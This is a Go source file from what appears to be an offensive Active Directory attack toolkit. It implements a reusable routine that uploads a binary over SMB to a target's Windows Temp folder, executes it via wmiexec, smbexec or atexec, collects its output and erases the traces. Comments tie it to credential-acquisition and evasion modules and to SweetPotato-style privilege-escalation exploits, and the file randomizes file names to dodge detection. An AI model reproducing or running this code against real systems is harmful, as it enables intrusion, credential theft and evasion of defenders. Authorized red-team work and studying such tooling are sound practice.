package tools

import (
	"context"
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"adpack/utils"
)

// PayloadDeployment is the canonical "drop a binary, run it, clean up" primitive
// for every evasion module. It exists because credential_acq.go used to repeat
// 30+ lines of upload→exec→cleanup logic for each profile, with subtly different
// error handling and no consistent evidence trail.
//
// Behavior:
//  1. Compute SHA256 of LocalPath (recorded in evidence and useful for IoC reports).
//  2. Generate a randomized RemoteName so re-runs don't trip same-filename detections.
//  3. Upload to RemoteDir via SMB (NetExec PutFile).
//  4. Execute via failover (or fire-and-forget if Detached=true).
//  5. Optionally retrieve OutputFile to LocalOutputPath.
//  6. Cleanup: best-effort delete of dropped binary + output file.
//
// The caller can opt out of any step (e.g. set NoCleanup=true for diagnosis,
// Detached=true for blocking exploits like SweetPotato that you never want to
// wait on).
type PayloadDeployment struct {
	// Source binary on the operator box (e.g. "MiniPlasma.exe").
	LocalPath string
	// Remote directory (must end with \). Defaults to C:\Windows\Temp\.
	RemoteDir string
	// Optional explicit remote name. Empty → randomized "<base>_<hex>.exe".
	RemoteName string
	// Arguments appended to the remote binary invocation, space-joined.
	RemoteArgs []string
	// If true, wraps remote command in `start /B` and uses default 30s wmiexec
	// timeout instead of failover. Use for SweetPotato-class blocking exploits.
	Detached bool
	// If non-zero, override per-attempt timeout for failover exec.
	PerAttemptTimeout time.Duration
	// Path inside RemoteDir where the binary is expected to write its output.
	// If set, will be retrieved post-exec to LocalOutputPath.
	OutputFile string
	// Local destination for OutputFile retrieval.
	LocalOutputPath string
	// If true, skip the post-exec cleanup phase.
	NoCleanup bool
}

// DeploymentResult captures everything the caller might want to record.
type DeploymentResult struct {
	BinaryHash      string // SHA256 hex of the uploaded binary
	RemotePath      string // Full remote path of the uploaded binary
	ExecMethod      string // "wmiexec", "smbexec", "atexec", or "detached"
	ExecStdout      string
	ExecStderr      string
	ExecSuccess     bool
	ExecError       string // Transport-level error message if execution failed
	OutputRetrieved bool
	CleanupErrors   []string
}

// Deploy uploads `localPath` to RemoteDir under a randomized name (or the
// caller-supplied RemoteName if non-empty) and returns the binary's SHA256 +
// the full remote path. Use this when the deployed binary needs to persist for
// later steps (e.g. driver load → exec → dump → retrieve flows).
//
// On success the caller is responsible for invoking CleanupRemote with the
// returned remotePath, ideally inside a defer.
func Deploy(ctx context.Context, target NetExecTarget, localPath, remoteDir, remoteName string) (remotePath, sha256hex string, err error) {
	if localPath == "" {
		return "", "", fmt.Errorf("Deploy: localPath required")
	}
	// Resolve through exe/ so callers can pass bare filenames like
	// "UnDefend.exe" whether they sit in CWD or exe/.
	if resolved := utils.ResolveLocalPath(localPath); resolved != "" {
		localPath = resolved
	}
	if remoteDir == "" {
		remoteDir = `C:\Windows\Temp\`
	}
	if !strings.HasSuffix(remoteDir, `\`) {
		remoteDir += `\`
	}
	hash, err := hashFile(localPath)
	if err != nil {
		return "", "", fmt.Errorf("hash %s: %w", localPath, err)
	}
	if remoteName == "" {
		remoteName = randomizedName(localPath)
	}
	remotePath = remoteDir + remoteName
	upload, uerr := NetExec.PutFile(ctx, target, localPath, remotePath)
	if uerr != nil {
		return remotePath, hash, fmt.Errorf("upload %s → %s: %w", localPath, remotePath, uerr)
	}
	if !upload.Success {
		return remotePath, hash, fmt.Errorf("upload %s → %s: nxc returned non-zero (exit=%d, stderr=%q)",
			localPath, remotePath, upload.ExitCode, strings.TrimSpace(upload.Stderr))
	}
	return remotePath, hash, nil
}

// CleanupRemote best-effort deletes a list of remote paths via failover-exec.
// Errors are returned aggregated but cleanup failures should rarely block
// the caller — operators can manually purge if needed.
func CleanupRemote(ctx context.Context, target NetExecTarget, remotePaths ...string) []error {
	var errs []error
	for _, p := range remotePaths {
		if p == "" {
			continue
		}
		delCmd := fmt.Sprintf(`del /F /Q "%s"`, p)
		_, err := NetExec.RunFailover(ctx, target, delCmd, 15*time.Second)
		if err != nil {
			errs = append(errs, fmt.Errorf("delete %s: %w", p, err))
		}
	}
	return errs
}

// ShortHash returns the first n characters of a hex hash, safely. Returns
// "(empty)" if h is empty and the full hash when shorter than n. Callers use
// this for log/evidence formatting where panicking on a short hash would be
// strictly worse than printing a truncated one.
func ShortHash(h string, n int) string {
	if h == "" {
		return "(empty)"
	}
	if len(h) < n {
		return h
	}
	return h[:n]
}

// hashFile returns the SHA256 hex digest of a local file.
func hashFile(path string) (string, error) {
	f, err := os.Open(path)
	if err != nil {
		return "", err
	}
	defer f.Close()
	h := sha256.New()
	if _, err := io.Copy(h, f); err != nil {
		return "", err
	}
	return hex.EncodeToString(h.Sum(nil)), nil
}

// randomizedName returns "<basename-without-ext>_<8 hex chars><ext>" so each
// deployment has a unique on-disk artifact. Falls back to a deterministic
// timestamp-based name if rand.Read fails (extremely unlikely).
func randomizedName(localPath string) string {
	base := filepath.Base(localPath)
	ext := filepath.Ext(base)
	stem := strings.TrimSuffix(base, ext)

	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return fmt.Sprintf("%s_%d%s", stem, time.Now().UnixNano(), ext)
	}
	return fmt.Sprintf("%s_%s%s", stem, hex.EncodeToString(b[:]), ext)
}

// RandString returns n random bytes as a hex string. Panics if rand.Read fails
// (extremely unlikely on any real system).
func RandString(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		panic("rand.Read: " + err.Error())
	}
	return hex.EncodeToString(b)
}
